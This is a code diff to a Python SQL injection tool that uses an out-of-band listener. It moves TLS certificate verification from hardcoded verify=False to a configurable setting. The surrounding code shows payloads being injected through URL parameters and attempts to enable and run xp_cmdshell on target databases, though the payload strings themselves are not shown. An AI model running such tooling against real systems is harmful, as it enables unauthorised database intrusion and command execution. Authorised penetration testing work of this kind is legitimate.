@@ -4,6 +4,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import requests
 
 from tools.log_utils import get_logger
+from tools.settings import settings
 
 logger = get_logger("sqli_oob")
 
@@ -72,6 +73,7 @@ class OOBListener:
 class SQLiOOB:
     def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
         self.sess = sess or requests.Session()
+        self.sess.verify = settings.verify_ssl
         self.timeout = timeout
         self.oob_listener = None
 
@@ -82,7 +84,7 @@ class SQLiOOB:
             try:
                 sep = "&" if "?" in url else "?"
                 self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
-                              timeout=self.timeout, verify=False)
+                              timeout=self.timeout)
                 result["findings"].append({"type": payload_type, "payload": payload[:50]})
                 result["vulnerable"] = True
             except Exception as e:
@@ -98,7 +100,7 @@ class SQLiOOB:
             try:
                 sep = "&" if "?" in url else "?"
                 self.sess.get("%s%s%s=%s" % (url, sep, param, cmd),
-                              timeout=self.timeout, verify=False)
+                              timeout=self.timeout)
                 result["findings"].append({"cmd": cmd[:40]})
             except Exception as e:
                 logger.debug("xp enable: %s", e)
@@ -106,7 +108,7 @@ class SQLiOOB:
         try:
             sep = "&" if "?" in url else "?"
             self.sess.get("%s%s%s=%s" % (url, sep, param, test_payload),
-                          timeout=self.timeout, verify=False)
+                          timeout=self.timeout)
             result["vulnerable"] = True
             result["findings"].append({"xp_cmdshell": test_payload[:40]})
         except Exception as e:
